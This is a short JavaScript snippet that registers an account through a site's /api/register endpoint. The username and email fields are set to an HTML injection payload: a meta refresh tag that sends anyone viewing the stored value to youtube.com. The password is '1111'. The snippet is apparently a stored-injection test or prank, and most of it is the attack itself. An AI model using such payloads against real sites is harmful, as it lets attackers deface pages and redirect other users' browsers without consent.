<script type="text/javascript">
 username = "<head><meta http-equiv='refresh' content='0; URL=http://youtube.com/'></head>";
email = "<head><meta http-equiv='refresh' content='0; URL=http://youtube.com/'></head>";
password = "1111";
password2 = "1111";

const data = {
  username,
  email,
  password,
  password2,
};
fetch("/api/register", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
  },
  body: JSON.stringify(data),
}).then((response) => {
  if (response.ok) {
    //user created
    successPopup.classList.remove("invisible");
    playMusic();
  }
});


</script>